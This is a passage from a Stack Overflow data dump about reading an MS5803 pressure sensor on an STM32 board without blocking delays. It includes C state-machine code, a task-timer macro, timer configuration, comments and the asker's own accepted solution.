measurement is ready", "body": "<h1>This isn't a \"how to read a sensor\" problem, this is a \"how to do non-blocking cooperative multi-tasking\" problem. Assuming you are running bare-metal (no operating system, such as FreeRTOS), you have two good options.</h1>\n\n<p>First, the datasheet shows you need to wait up to 9.04 ms, or 9040 us. \n<a href=\"https://i.stack.imgur.com/zSHWN.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/zSHWN.png\" alt=\"enter image description here\"></a> </p>\n\n<h2>Now, here are your cooperative multi-tasking options:</h2>\n\n<ol>\n<li><p>Send a command to tell the device to do an ADC conversion (ie: to take an analog measurement), then configure a hardware timer to interrupt you exactly 9040 us later. In your ISR you then can either set a flag to tell your main loop to send a read command to read the result, OR you can just send the read command right inside the ISR. </p></li>\n<li><p>Use non-blocking time-stamp-based cooperative multi-tasking in your main loop. This will likely require a basic state machine. Send the conversion command, then move on, doing other things. When your time stamp indicates it's been long enough, send the read command to read the converted result from the sensor. </p></li>\n</ol>\n\n<p>Number 1 above is my preferred approach for time-critical tasks. This isn't time-critical, however, and a little jitter won't make any difference, so Number 2 above is my preferred approach for general, bare-metal cooperative multi-tasking, so let's do that. </p>\n\n<h2>Here's a sample program to demonstrate the principle of time-stamp-based bare-metal cooperative multi-tasking for your specific case where you need to:</h2>\n\n<ol>\n<li>request a data sample (start ADC conversion in your external sensor)</li>\n<li>wait 9040 us for the conversion to complete</li>\n<li>read in the data sample from your external sensor (now that the ADC conversion is complete)</li>\n</ol>\n\n<p>Code: </p>\n\n<pre><code>enum sensorState_t \n{\n    SENSOR_START_CONVERSION,\n    SENSOR_WAIT,\n    SENSOR_GET_CONVERSION\n}\n\nint main(void)\n{\n    doSetupStuff();\n    configureHardwareTimer(); // required for getMicros() to work\n\n    while (1)\n    {\n        //\n        // COOPERATIVE TASK #1\n        // Read the under-water pressure sensor as fast as permitted by the datasheet\n        //\n        static sensorState_t sensorState = SENSOR_START_CONVERSION; // initialize state machine\n        static uint32_t task1_tStart; // us; start time\n        static uint32_t sensorVal; // the sensor value you are trying to obtain \n        static bool newSensorVal = false; // set to true whenever a new value arrives\n        switch (sensorState)\n        {\n            case SENSOR_START_CONVERSION:\n            {\n                startConversion(); // send command to sensor to start ADC conversion\n                task1_tStart = getMicros(); // get a microsecond time stamp\n                sensorState = SENSOR_WAIT; // next state \n                break;\n            }\n            case SENSOR_WAIT:\n            {\n                const uint32_t DESIRED_WAIT_TIME = 9040; // us\n                uint32_t tNow = getMicros();\n                if (tNow - task1_tStart &gt;= DESIRED_WAIT_TIME)\n                {\n                    sensorState = SENSOR_GET_CONVERSION; // next state\n                }\n                break;\n            }\n            case SENSOR_GET_CONVERSION:\n            {\n                sensorVal = readConvertedResult(); // send command to read value from the sensor\n                newSensorVal = true;\n                sensorState = SENSOR_START_CONVERSION; // next state \n                break;\n            }\n        }\n\n        //\n        // COOPERATIVE TASK #2\n        // use the under-water pressure sensor data right when it comes in (this will be an event-based task\n        // whose running frequency depends on the rate of new data coming in, for example)\n        //\n        if (newSensorVal == true)\n        {\n            newSensorVal = false; // reset this flag \n\n            // use the sensorVal data here now for whatever you need it for\n        }\n\n\n        //\n        // COOPERATIVE TASK #3\n        //\n\n\n        //\n        // COOPERATIVE TASK #4\n        //\n\n\n        // etc etc\n\n    } // end of while (1)\n} // end of main\n</code></pre>\n\n<p>For another really simple timestamp-based multi-tasking example see <a href=\"https://www.arduino.cc/en/Tutorial/BlinkWithoutDelay\" rel=\"nofollow noreferrer\">Arduino's \"Blink Without Delay\" example here</a>. </p>\n\n<h1>General <em>time-stamp-based bare-metal cooperative multi-tasking</em> architecture notes:</h1>\n\n<p>Depending on how you do it all, in the end, you basically end up with this type of code layout, which simply runs each task at fixed time intervals. Each task should be <strong>non-blocking</strong> to ensure it does not conflict with the run intervals of the other tasks. Non-blocking on bare metal means simply \"do not use clock-wasting delays, busy-loops, or other types of polling, repeating, counting, or busy delays!\". (This is opposed to \"blocking\" on an operating-system-based (OS-based) system, which means \"giving the clock back to the scheduler to let it run another thread while this task 'sleeps'.\" Remember: <strong>bare metal</strong> means <em>no operating system</em>!).  Instead, if something isn't quite ready to run yet, simply save your state via a state machine, exit this task's code (this is the \"cooperative\" part, as your task must voluntarily give up the processor by returning), and let another task run!</p>\n\n<p>Here's the basic architecture, showing a simple timestamp-based way to get 3 Tasks to run at independent, fixed frequencies withOUT relying on any interrupts, and with <strong>minimal jitter</strong>, due to the thorough and methodical approach I take to check the timestamps and update the start time at each run time.</p>\n\n<p>1st, the definition for the <code>main()</code> function and main loop:</p>\n\n<pre><code>int main(void)\n{\n    doSetupStuff();\n    configureHardwareTimer();\n\n    while (1)\n    {\n        doTask1();\n        doTask2();\n        doTask3();\n    }\n}\n</code></pre>\n\n<p>2nd, the definitions for the <code>doTask()</code> functions:</p>\n\n<pre><code>// Task 1: Let's run this one at 100 Hz (every 10ms)\nvoid doTask1(void)\n{\n    const uint32_t DT_DESIRED_US = 10000; // 10000us = 10ms, or 100Hz run freq\n    static uint32_t t_start_us = getMicros();\n    uint32_t t_now_us = getMicros();\n    uint32_t dt_us = t_now_us - t_start_us;\n\n    // See if it's time to run this Task\n    if (dt_us &gt;= DT_DESIRED_US)\n    {\n        // 1. Add DT_DESIRED_US to t_start_us rather than setting t_start_us to t_now_us (which many \n        // people do) in order to ***avoid introducing artificial jitter into the timing!***\n        t_start_us += DT_DESIRED_US;\n        // 2. Handle edge case where it's already time to run again because just completing one of the main\n        // \"scheduler\" loops in the main() function takes longer than DT_DESIRED_US; in other words, here\n        // we are seeing that t_start_us is lagging too far behind (more than one DT_DESIRED_US time width\n        // from t_now_us), so we are \"fast-forwarding\" t_start_us up to the point where it is exactly \n        // 1 DT_DESIRED_US time width back now, thereby causing this task to instantly run again the \n        // next time it is called (trying as hard as we can to run at the specified frequency) while \n        // at the same time protecting t_start_us from lagging farther and farther behind, as that would\n        // eventually cause buggy and incorrect behavior when the (unsigned) timestamps start to roll over\n        // back to zero.\n        dt_us = t_now_us - t_start_us; // calculate new time delta with newly-updated t_start_us\n        if (dt_us &gt;= DT_DESIRED_US)\n        {\n            t_start_us = t_now_us - DT_DESIRED_US;\n        }\n\n        // PERFORM THIS TASK'S OPERATIONS HERE!\n\n    }\n}\n\n// Task 2: Let's run this one at 1000 Hz (every 1ms)\nvoid doTask2(void)\n{\n    const uint32_t DT_DESIRED_US = 1000; // 1000us = 1ms, or 1000Hz run freq\n    static uint32_t t_start_us = getMicros();\n    uint32_t t_now_us = getMicros();\n    uint32_t dt_us = t_now_us - t_start_us;\n\n    // See if it's time to run this Task\n    if (dt_us &gt;= DT_DESIRED_US)\n    {\n        t_start_us += DT_DESIRED_US;\n        dt_us = t_now_us - t_start_us; // calculate new time delta with newly-updated t_start_us\n        if (dt_us &gt;= DT_DESIRED_US)\n        {\n            t_start_us = t_now_us - DT_DESIRED_US;\n        }\n\n        // PERFORM THIS TASK'S OPERATIONS HERE!\n\n    }\n}\n\n// Task 3: Let's run this one at 10 Hz (every 100ms)\nvoid doTask3(void)\n{\n    const uint32_t DT_DESIRED_US = 100000; // 100000us = 100ms, or 10Hz run freq\n    static uint32_t t_start_us = getMicros();\n    uint32_t t_now_us = getMicros();\n    uint32_t dt_us = t_now_us - t_start_us;\n\n    // See if it's time to run this Task\n    if (dt_us &gt;= DT_DESIRED_US)\n    {\n        t_start_us += DT_DESIRED_US;\n        dt_us = t_now_us - t_start_us; // calculate new time delta with newly-updated t_start_us\n        if (dt_us &gt;= DT_DESIRED_US)\n        {\n            t_start_us = t_now_us - DT_DESIRED_US;\n        }\n\n        // PERFORM THIS TASK'S OPERATIONS HERE!\n\n    }\n}\n</code></pre>\n\n<p>The code above works perfectly but as you can see is pretty redundant and a bit irritating to set up new tasks. This job can be a bit more automated and much much easier to do by simply defining a macro, <code>CREATE_TASK_TIMER()</code>, as follows, to do all of the redundant timing stuff and timestamp variable creation for us:</p>\n\n<pre><code>/// @brief      A function-like macro to get a certain set of events to run at a desired, fixed \n///             interval period or frequency.\n/// @details    This is a timestamp-based time polling technique frequently used in bare-metal\n///             programming as a basic means of achieving cooperative multi-tasking. Note \n///             that getting the timing details right is difficult, hence one reason this macro \n///             is so useful. The other reason is that this maro significantly reduces the number of\n///             lines of code you need to write to introduce a new timestamp-based cooperative\n///             task. The technique used herein achieves a perfect desired period (or freq) \n///             on average, as it centers the jitter inherent in any polling technique around \n///             the desired time delta set-point, rather than always lagging as many other \n///             approaches do.\n///             \n///             USAGE EX:\n///             ```\n///             // Create a task timer to run at 500 Hz (every 2000 us, or 2 ms; 1/0.002 sec = 500 Hz)\n///             const uint32_t PERIOD_US = 2000; // 2000 us pd --&gt; 500 Hz freq\n///             bool time_to_run;\n///             CREATE_TASK_TIMER(PERIOD_US, time_to_run);\n///             if (time_to_run)\n///             {\n///                 run_task_2();\n///             }\n///             ```\n///\n///             Source: Gabriel Staples \n///             https://stackoverflow.com/questions/50028821/best-way-to-read-from-a-sensors-that-doesnt-have-interrupt-pin-and-require-some/50032992#50032992\n/// @param[in]  dt_desired_us   The desired delta time period, in microseconds; note: pd = 1/freq;\n///                             the type must be `uint32_t`\n/// @param[out] time_to_run     A `bool` whose scope will enter *into* the brace-based scope block\n///                             below; used as an *output* flag to the caller: this variable will \n///                             be set to true if it is time to run your code, according to the \n///                             timestamps, and will be set to false otherwise\n/// @return     NA--this is not a true function\n#define CREATE_TASK_TIMER(dt_desired_us, time_to_run)                                                                  \\\n{ /* Use scoping braces to allow multiple calls of this macro all in one outer scope while */                          \\\n  /* allowing each variable created below to be treated as unique to its own scope */                                  \\\n    time_to_run = false;                                                                                               \\\n                                                                                                                       \\\n    /* set the desired run pd / freq */                                                                                \\\n    const uint32_t DT_DESIRED_US = dt_desired_us;                                                                      \\\n    static uint32_t t_start_us = getMicros();                                                                          \\\n    uint32_t t_now_us = getMicros();                                                                                   \\\n    uint32_t dt_us = t_now_us - t_start_us;                                                                            \\\n                                                                                                                       \\\n    /* See if it's time to run this Task */                                                                            \\\n    if (dt_us &gt;= DT_DESIRED_US)                                                                                        \\\n    {                                                                                                                  \\\n        /* 1. Add DT_DESIRED_US to t_start_us rather than setting t_start_us to t_now_us (which many */                \\\n        /* people do) in order to ***avoid introducing artificial jitter into the timing!*** */                        \\\n        t_start_us += DT_DESIRED_US;                                                                                   \\\n        /* 2. Handle edge case where it's already time to run again because just completing one of the main */         \\\n        /* \"scheduler\" loops in the main() function takes longer than DT_DESIRED_US; in other words, here */           \\\n        /* we are seeing that t_start_us is lagging too far behind (more than one DT_DESIRED_US time width */          \\\n        /* from t_now_us), so we are \"fast-forwarding\" t_start_us up to the point where it is exactly */               \\\n        /* 1 DT_DESIRED_US time width back now, thereby causing this task to instantly run again the */                \\\n        /* next time it is called (trying as hard as we can to run at the specified frequency) while */                \\\n        /* at the same time protecting t_start_us from lagging farther and farther behind, as that would */            \\\n        /* eventually cause buggy and incorrect behavior when the (unsigned) timestamps start to roll over */          \\\n        /* back to zero. */                                                                                            \\\n        dt_us = t_now_us - t_start_us; /* calculate new time delta with newly-updated t_start_us */                    \\\n        if (dt_us &gt;= DT_DESIRED_US)                                                                                    \\\n        {                                                                                                              \\\n            t_start_us = t_now_us - DT_DESIRED_US;                                                                     \\\n        }                                                                                                              \\\n                                                                                                                       \\\n        time_to_run = true;                                                                                            \\\n    }                                                                                                                  \\\n}\n</code></pre>\n\n<p>Now, there are multiple ways to use it, but for the sake of this demo, in order to keep the really clean <code>main()</code> loop code which looks like this:</p>\n\n<pre><code>int main(void)\n{\n    doSetupStuff();\n    configureHardwareTimer();\n\n    while (1)\n    {\n        doTask1();\n        doTask2();\n        doTask3();\n    }\n}\n</code></pre>\n\n<p>Let's use the <code>CREATE_TASK_TIMER()</code> macro like this. As you can see, the code is now much cleaner and easier to set up a new task. <em>This is my preferred approach, because it creates the really clean main loop shown just above, with just the various <code>doTask()</code> calls, which are also easy to write and maintain:</em></p>\n\n<pre><code>// Task 1: Let's run this one at 100 Hz (every 10ms, or 10000us)\nvoid doTask1(void)\n{\n    bool time_to_run;\n    const uint32_t DT_DESIRED_US = 10000; // 10000us = 10ms, or 100Hz run freq\n    CREATE_TASK_TIMER(DT_DESIRED_US, time_to_run);\n    if (time_to_run)\n    {\n        // PERFORM THIS TASK'S OPERATIONS HERE!\n    }\n}\n\n// Task 2: Let's run this one at 1000 Hz (every 1ms)\nvoid doTask2(void)\n{\n    bool time_to_run;\n    const uint32_t DT_DESIRED_US = 1000; // 1000us = 1ms, or 1000Hz run freq\n    CREATE_TASK_TIMER(DT_DESIRED_US, time_to_run);\n    if (time_to_run)\n    {\n        // PERFORM THIS TASK'S OPERATIONS HERE!\n    }\n}\n\n// Task 3: Let's run this one at 10 Hz (every 100ms)\nvoid doTask3(void)\n{\n    bool time_to_run;\n    const uint32_t DT_DESIRED_US = 100000; // 100000us = 100ms, or 10Hz run freq\n    CREATE_TASK_TIMER(DT_DESIRED_US, time_to_run);\n    if (time_to_run)\n    {\n        // PERFORM THIS TASK'S OPERATIONS HERE!\n    }\n}\n</code></pre>\n\n<p>Alternatively, however, you could structure the code more like this, which works equally as well and produces the same effect, just in a slightly different way:</p>\n\n<pre><code>#include &lt;stdbool.h&gt;\n#include &lt;stdint.h&gt;\n\n#define TASK1_PD_US (10000)     // 10ms pd, or 100 Hz run freq \n#define TASK2_PD_US (1000)      // 1ms pd, or 1000 Hz run freq \n#define TASK3_PD_US (100000)    // 100ms pd, or 10 Hz run freq \n\n// Task 1: Let's run this one at 100 Hz (every 10ms, or 10000us)\nvoid doTask1(void)\n{\n    // PERFORM THIS TASK'S OPERATIONS HERE!\n}\n\n// Task 2: Let's run this one at 1000 Hz (every 1ms)\nvoid doTask2(void)\n{\n    // PERFORM THIS TASK'S OPERATIONS HERE!\n}\n\n// Task 3: Let's run this one at 10 Hz (every 100ms)\nvoid doTask3(void)\n{\n    // PERFORM THIS TASK'S OPERATIONS HERE!\n}\n\nint main(void)\n{\n    doSetupStuff();\n    configureHardwareTimer();\n\n    while (1)\n    {\n        bool time_to_run;\n\n        CREATE_TASK_TIMER(TASK1_PD_US, time_to_run);\n        if (time_to_run)\n        {\n            doTask1();\n        }\n\n        CREATE_TASK_TIMER(TASK2_PD_US, time_to_run);\n        if (time_to_run)\n        {\n            doTask2();\n        }\n\n        CREATE_TASK_TIMER(TASK3_PD_US, time_to_run);\n        if (time_to_run)\n        {\n            doTask3();\n        }\n    }\n}\n</code></pre>\n\n<p>Part of the art (and fun!) of embedded bare-metal microcontroller programming is the skill and ingenuity involved in deciding exactly how you want to interleave each task and get them to run together, all as though they were running in parallel. Use one of the above formats as a starting point, and adapt to your particular circumstances. Message-passing can be added between tasks or between tasks and interrupts, tasks and a user, etc, as desired, and as required for your particular application.</p>\n\n<h2>Here's an example of how to configure a timer for use as a timestamp-generator on an STM32F2 microcontroller.</h2>\n\n<p>This shows functions for <code>configureHardwareTimer()</code> and <code>getMicros()</code>, used above:</p>\n\n<pre><code>// Timer handle to be used for Timer 2 below\nTIM_HandleTypeDef TimHandle;\n\n// Configure Timer 2 to be used as a free-running 32-bit hardware timer for general-purpose use as a 1-us-resolution\n// timestamp source\nvoid configureHardwareTimer()\n{\n    // Timer clock must be enabled before you can configure it\n    __HAL_RCC_TIM2_CLK_ENABLE();\n\n    // Calculate prescaler\n    // Here are some references to show how this is done:\n    // 1) \"STM32Cube_FW_F2_V1.7.0/Projects/STM32F207ZG-Nucleo/Examples/TIM/TIM_OnePulse/Src/main.c\" shows the\n    //    following (slightly modified) equation on line 95: `Prescaler = (TIMxCLK/TIMx_counter_clock) - 1`\n    // 2) \"STM32F20x and STM32F21x Reference Manual\" states the following on pg 419: \"14.4.11 TIMx prescaler (TIMx_PSC)\"\n    //    \"The counter clock frequency CK_CNT is equal to fCK_PSC / (PSC[15:0] + 1)\"\n    //    This means that TIMx_counter_clock_freq = TIMxCLK/(prescaler + 1). Now, solve for prescaler and you\n    //    get the exact same equation as above: `prescaler = TIMxCLK/TIMx_counter_clock_freq - 1`\n    // Calculating TIMxCLK:\n    // - We must divide SystemCoreClock (returned by HAL_RCC_GetHCLKFreq()) by 2 because TIM2 uses clock APB1\n    // as its clock source, and on my board this is configured to be 1/2 of the SystemCoreClock.\n    // - Note: To know which clock source each peripheral and timer uses, you can look at\n    //  \"Table 25. Peripheral current consumption\" in the datasheet, p86-88.\n    const uint32_t DESIRED_TIMER_FREQ = 1e6; // 1 MHz clock freq --&gt; 1 us pd per tick, which is what I want\n    uint32_t Tim2Clk = HAL_RCC_GetHCLKFreq() / 2;\n    uint32_t prescaler = Tim2Clk / DESIRED_TIMER_FREQ - 1; // Don't forget the minus 1!\n\n    // Configure timer\n    // TIM2 is a 32-bit timer; See datasheet \"Table 4. Timer feature comparison\", p30-31\n    TimHandle.Instance               = TIM2;\n    TimHandle.Init.Period            = 0xFFFFFFFF; // Set pd to max possible for a 32-bit timer\n    TimHandle.Init.Prescaler         = prescaler;\n    TimHandle.Init.ClockDivision     = TIM_CLOCKDIVISION_DIV1;\n    TimHandle.Init.CounterMode       = TIM_COUNTERMODE_UP;\n    TimHandle.Init.RepetitionCounter = 0; // NA (has no significance) for this timer\n\n    // Initialize the timer\n    if (HAL_TIM_Base_Init(&amp;TimHandle) != HAL_OK)\n    {\n        // handle error condition\n    }\n\n    // Start the timer\n    if (HAL_TIM_Base_Start(&amp;TimHandle) != HAL_OK)\n    {\n        // handle error condition\n    }\n}\n\n// Get the 1 us count value on Timer 2.\n// This timer will be used for general purpose hardware timing that does NOT rely on interrupts.\n// Therefore, the counter will continue to increment even with interrupts disabled.\n// The count value increments every 1 microsecond.\n// Since it is a 32-bit counter it overflows every 2^32 counts, which means the highest value it can\n// store is 2^32 - 1 = 4294967295. Overflows occur every 2^32 counts / 1 count/us / 1e6us/sec\n// = ~4294.97 sec = ~71.6 min.\nuint32_t getMicros()\n{\n    return __HAL_TIM_GET_COUNTER(&amp;TimHandle);\n}\n</code></pre>\n\n<h1>References:</h1>\n\n<ol>\n<li><a href=\"https://www.arduino.cc/en/tutorial/BlinkWithoutDelay\" rel=\"nofollow noreferrer\">https://www.arduino.cc/en/tutorial/BlinkWithoutDelay</a></li>\n<li>Doxygen: <a href=\"https://stackoverflow.com/questions/15398711/whats-the-right-way-to-reference-a-parameter-in-doxygen/56745246#56745246\">What&#39;s the right way to reference a parameter in Doxygen?</a></li>\n<li>Enum-based error codes for error handling: <a href=\"https://stackoverflow.com/questions/385975/error-handling-in-c-code/59221452#59221452\">Error handling in C code</a></li>\n<li>Other architectural styles in C, such as \"object-based\" C via opaque pointers: <a href=\"https://stackoverflow.com/questions/3965279/opaque-c-structs-how-should-they-be-declared/54488289#54488289\">Opaque C structs: how should they be declared?</a></li>\n</ol>\n"}, {"comments": [{"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1524948942, "post_id": 50079040, "comment_id": 87177867, "body": "Not the address transmitting is stretched."}, {"owner": {"reputation": 11050, "user_id": 4561887, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/1ecb6a74fca21551bd8157504ad47faf?s=128&d=identicon&r=PG&f=1", "display_name": "Gabriel Staples", "link": "https://stackoverflow.com/users/4561887/gabriel-staples"}, "edited": false, "score": 0, "creation_date": 1525042782, "post_id": 50079040, "comment_id": 87200338, "body": "@Alek, it makes sense to me that the ack bit comes immediately right after the &quot;Convert&quot; command, as that&#39;s what I expected, but what about right after the &quot;ADC Read&quot; command? I still expect the ack bit to come immediately, but I wonder: If you do a &quot;Convert&quot; command immediately followed by an &quot;ADC Read&quot; command, what happens? Does the ack bit not come until the data is ready (forcing <a href=\"https://learn.sparkfun.com/tutorials/i2c\" rel=\"nofollow noreferrer\">&quot;clock stretching&quot;</a>, or does it just give you bad data, or something else?"}, {"owner": {"reputation": 11050, "user_id": 4561887, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/1ecb6a74fca21551bd8157504ad47faf?s=128&d=identicon&r=PG&f=1", "display_name": "Gabriel Staples", "link": "https://stackoverflow.com/users/4561887/gabriel-staples"}, "edited": false, "score": 1, "creation_date": 1525043186, "post_id": 50079040, "comment_id": 87200424, "body": "@Alek, also, I believe that every good question is a valuable opportunity to teach something, and no good answer can exist without also being a good example of teaching (it is by definition not a good answer otherwise, and probably hardly even qualifies as an &quot;answer&quot; at all), and that&#39;s how I try to conduct myself online in general: I try to help others and <i>teach</i> them what they need to know to have a complete answer, just as I hope others will do for me when I have a question. I&#39;ve also witnessed a lot of really good teaching on Stack Overflow in general and think most users agree w/me."}, {"owner": {"reputation": 11050, "user_id": 4561887, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/1ecb6a74fca21551bd8157504ad47faf?s=128&d=identicon&r=PG&f=1", "display_name": "Gabriel Staples", "link": "https://stackoverflow.com/users/4561887/gabriel-staples"}, "edited": false, "score": 0, "creation_date": 1526249598, "post_id": 50079040, "comment_id": 87658055, "body": "Follow-up: did you ever try it?"}, {"owner": {"reputation": 392, "user_id": 3245247, "user_type": "registered", "accept_rate": 36, "profile_image": "https://i.stack.imgur.com/EPh8M.png?s=128&g=1", "display_name": "Alexis", "link": "https://stackoverflow.com/users/3245247/alexis"}, "reply_to_user": {"reputation": 11050, "user_id": 4561887, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/1ecb6a74fca21551bd8157504ad47faf?s=128&d=identicon&r=PG&f=1", "display_name": "Gabriel Staples", "link": "https://stackoverflow.com/users/4561887/gabriel-staples"}, "edited": false, "score": 0, "creation_date": 1528088203, "post_id": 50079040, "comment_id": 88356840, "body": "@Gabriel: I didn&#39;t try it yet. I had to move to another project. But I will take care of testing that as soon as possible."}, {"owner": {"reputation": 11050, "user_id": 4561887, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/1ecb6a74fca21551bd8157504ad47faf?s=128&d=identicon&r=PG&f=1", "display_name": "Gabriel Staples", "link": "https://stackoverflow.com/users/4561887/gabriel-staples"}, "edited": false, "score": 0, "creation_date": 1528345440, "post_id": 50079040, "comment_id": 88473586, "body": "I look forward to an answer. Thanks!"}], "tags": [], "owner": {"reputation": 392, "user_id": 3245247, "user_type": "registered", "accept_rate": 36, "profile_image": "https://i.stack.imgur.com/EPh8M.png?s=128&g=1", "display_name": "Alexis", "link": "https://stackoverflow.com/users/3245247/alexis"}, "is_accepted": true, "score": 0, "last_activity_date": 1524935649, "last_edit_date": 1524935649, "creation_date": 1524935194, "answer_id": 50079040, "question_id": 50028821, "link": "https://stackoverflow.com/questions/50028821/best-way-to-read-from-a-sensor-that-doesnt-have-interrupt-pin-and-requires-some/50079040#50079040", "title": "Best way to read from a sensor that doesn&#39;t have interrupt pin and requires some time before the measurement is ready", "body": "<p>First of all thank you for your suggestions. I tried to analyze every single possible solution you proposed. </p>\n\n<p>The solution proposed by Peter seemed very interesting but I have to say that, after having gone through the datasheet several times, I don't believe that is feasible. My consideration is based on the following facts.</p>\n\n<p>Using a scope I see that the acknowledge is received right after sending the command for doing conversion. See following image concerning the temperature conversion:</p>\n\n<p><a href=\"https://i.stack.imgur.com/Go01B.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/Go01B.png\" alt=\"enter image description here\"></a></p>\n\n<p>It seems quite clear to me the acknowledge bit right after the command. After that the SDA line (yellow) goes high, therefore I don't see how it is possible that I can exploit that for detecting when the conversion is ready.</p>\n\n<p>Concerning the solution when using SPI, yes, the SDO remains low during the conversion, but I cannot use it: I need to stick with I2C. Furthermore, I have other sensors attached to that SPI bus and I agree with what Gabriel Staples says.</p>\n\n<p>After my consideration I went for the solution proposed by Gabriel Staples (considering that, in order to read pressure value, I also need to read and convert temperature).</p>\n\n<p>My current solution is based on a state machine with 6 states. In my solution, I distinguish between the wait time for the pressure conversion and the wait time for the temperature conversion with the idea the I could try to see how much the pressure reading degrades if I use a less precise temperature reading.</p>\n\n<p>Here is my current solution. The following function is called inside the main while:</p>\n\n<pre><code>void MS5803_update()\n{\n  static uint32_t tStart; // us; start time\n\n  switch (sensor_state)\n  {\n    case MS5803_REQUEST_TEMPERATURE:\n    {\n        MS5803_send_command(MS5803_CMD_ADC_CONV + TEMPERATURE + baro.resolution);\n        tStart = HAL_GetTick();\n        sensor_state = MS5803_WAIT_RAW_TEMPERATURE;\n        break;\n    }\n\n    case MS5803_WAIT_RAW_TEMPERATURE:\n    {\n        uint32_t tNow = HAL_GetTick();\n        if (tNow - tStart &gt;= conversion_time)\n        {\n            sensor_state = MS5803_CONVERTING_TEMPERATURE;\n        }\n        break;\n    }\n\n    case MS5803_CONVERTING_TEMPERATURE:\n    {\n        MS5803_send_command(MS5803_CMD_ADC_READ);\n        uint8_t raw_value[3]; // Read 24 bit\n        MS5803_read_value(raw_value,3);\n        temperature_raw = ((uint32_t)raw_value[0] &lt;&lt; 16) + ((uint32_t)raw_value[1] &lt;&lt; 8) + raw_value[2];\n        sensor_state = MS5803_REQUEST_PRESSURE;\n        break;\n    }\n\n    case MS5803_REQUEST_PRESSURE:\n    {\n        MS5803_send_command(MS5803_CMD_ADC_CONV + PRESSURE + baro.resolution);\n        tStart = HAL_GetTick();\n        sensor_state = MS5803_WAIT_RAW_PRESSURE;\n        break;\n    }\n\n    case MS5803_WAIT_RAW_PRESSURE:\n    {\n        uint32_t tNow = HAL_GetTick();\n        if (tNow - tStart &gt;= conversion_time)\n        {\n            sensor_state = MS5803_CONVERTING_PRESSURE;\n        }\n        break;\n    }\n\n    case MS5803_CONVERTING_PRESSURE:\n    {\n        MS5803_send_command(MS5803_CMD_ADC_READ);\n        uint8_t raw_value[3]; // Read 24 bit\n        MS5803_read_value(raw_value,3);\n        pressure_raw = ((uint32_t)raw_value[0] &lt;&lt; 16) + ((uint32_t)raw_value[1] &lt;&lt; 8) + raw_value[2];\n\n        // Now I have both temperature and pressure raw and I can convert them\n        MS5803_updateMeasurements();\n\n        // Reset the state machine to perform a new measurement\n        sensor_state = MS5803_REQUEST_TEMPERATURE;\n        break;\n    }\n  }\n}\n</code></pre>\n\n<p>I don't pretend that my solution is better. I just post it in order to have an opinion from you guys. Note: I'm still working on it. Therefore I cannot guarantee is bug-free!</p>\n\n<p>For PeterJ_01: I could agree that this is not strictly a teaching portal, but I believe that everybody around here asks questions to learn something new or to improve theirselves. Therefore, if you believe that the solution using the ack is better, it would be great if you could show us a draft of your idea. For me it would be something new to learn.</p>\n\n<p>Any further comment is appreciated.</p>\n"}], "owner": {"reputation": 392, "user_id": 3245247, "user_type": "registered", "accept_rate": 36, "profile_image": "https://i.stack.imgur.com/EPh8M.png?s=128&g=1", "display_name": "Alexis", "link": "https://stackoverflow.com/users/3245247/alexis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1601, "favorite_count": 1, "accepted_answer_id": 50079040, "answer_count": 2, "score": 2, "last_activity_date": 1592523124, "creation_date": 1524679886, "last_edit_date": 1592523124, "question_id": 50028821, "link": "https://stackoverflow.com/questions/50028821/best-way-to-read-from-a-sensor-that-doesnt-have-interrupt-pin-and-requires-some", "title": "Best way to read from a sensor that doesn&#39;t have interrupt pin and requires some time before the measurement is ready", "body": "<p>I'm trying to interface a pressure sensor (MS5803-14BA) with my board (NUCLEO-STM32L073RZ).</p>\n\n<p>According to the <a href=\"http://www.te.com/commerce/DocumentDelivery/DDEController?Action=showdoc&amp;DocId=Data%20Sheet%7FMS5803-14BA%7FB3%7Fpdf%7FEnglish%7FENG_DS_MS5803-14BA_B3.pdf%7FCAT-BLPS0013\" rel=\"nofollow noreferrer\">datasheet</a> (page 3), the pressure sensor requires some milliseconds before the measurement is ready to be read. For my project, I would be interested in the highest resolution that requires around 10 ms for the conversion of the raw data.</p>\n\n<p>Unfortunately, this pressure sensor doesn't have any interrupt pin that can be exploited to see when the measurement is ready, and therefore I temporarily solved the problem putting a delay after the request of new data.</p>\n\n<p>I don't like my current solution, since in those 10 ms I could put the mcu working on something else (I have several other sensors attached to my board), but without any interrupt pin, I'm not sure about what is the best way to solve this problem.</p>\n\n<p>Another solution came into my mind: Using a timer that triggers every say 20 ms and performs the following operations:</p>\n\n<pre><code>1.a Read the current value stored in the registers (discarding the first value)\n1.b Ask for a new value\n</code></pre>\n\n<p>In this way, at the next iteration I would just need to read the value requested at the end of the previous iteration.</p>\n\n<p>What I don't like is that my measurement would be always 20 ms old. Until the delay remains 20 ms, it should be still fine, but if I need to reduce the rate, the \"age\" of the reading with my solution would increase.</p>\n\n<p>Do you have any other idea about how to deal with this?</p>\n\n<p>Thank you.</p>\n\n<p>Note: Please let me know if you would need to see my current implementation.</p>\n"}, {"tags": ["c++", "c", "sockets", "ubuntu-17.10"], "comments": [{"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 2, "creation_date": 1524679684, "post_id": 50028731, "comment_id": 87073586, "body": "That <code>3</code> is a <i>byte count</i>, not an element count. the two are only synonymous if you&#39;re sending simple octets. Chances are you&#39;re not even sending one full <code>int</code>, much less three. Unrelated, <code>&amp;arr</code> could just be <code>arr</code> in the send call. Won&#39;t really matter, but still."}, {"owner": {"reputation": 32321, "user_id": 173397, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pqKT8.jpg?s=128&g=1", "display_name": "pm100", "link": 